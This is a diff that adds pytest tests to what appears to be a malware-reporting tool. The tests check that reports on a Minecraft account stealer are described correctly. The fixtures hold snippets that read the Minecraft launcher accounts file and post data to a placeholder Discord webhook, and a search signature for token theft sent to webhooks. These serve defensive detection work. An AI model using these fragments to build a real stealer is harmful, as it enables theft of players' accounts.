@@ -440,3 +440,29 @@ def test_submit_error_keeps_osm_response_body(monkeypatch):
     monkeypatch.setattr(requests, "post", lambda *a, **k: Resp())
     with pytest.raises(requests.HTTPError, match="Requested function was not found"):
         _RequestsPoster().post_json("https://osm.example/functions/v1/x", json={})
+
+
+def test_minecraft_stealer_report_describes_account_theft():
+    # A Minecraft stealer must not be described with the generic SSH/cloud key
+    # wording; the webhook it posts to is an IOC.
+    r = build_report(_row(raw_payload=json.dumps({"bash_findings": [
+        {"file": "src/main/java/me/x/Grabber.java", "line": 40,
+         "category": "credential_access", "rule": "mc-launcher-accounts",
+         "snippet": 'new File(home, ".minecraft/launcher_accounts.json")'},
+        {"file": "src/main/java/me/x/Grabber.java", "line": 52,
+         "category": "network_exfil", "rule": "discord-webhook",
+         "snippet": 'post("https://discord.com/api/webhooks/123/abc", data)'}]})))
+    assert "Minecraft" in r["threat_description"]
+    assert "private keys and cloud" not in r["threat_description"]
+    assert "minecraft-account-stealer" in r["tags"]
+    assert "https://discord.com/api/webhooks/123/abc" in r["verified_iocs"]
+    assert "credential_access/mc-launcher-accounts (1 file)" in r["payload_description"]
+    assert "network_exfil/discord-webhook (1 file)" in r["payload_description"]
+
+
+def test_report_names_the_signature_that_found_the_repo():
+    sig = '"getSession().getToken()" "discord.com/api/webhooks" language:Java'
+    r = build_report(_row(matched_iocs=json.dumps([sig])))
+    assert sig in r["threat_description"]
+    assert "matching rule" not in r["threat_description"]  # links carry file+line only
+    assert "confirmed malware signature" not in build_report(_row())["threat_description"]
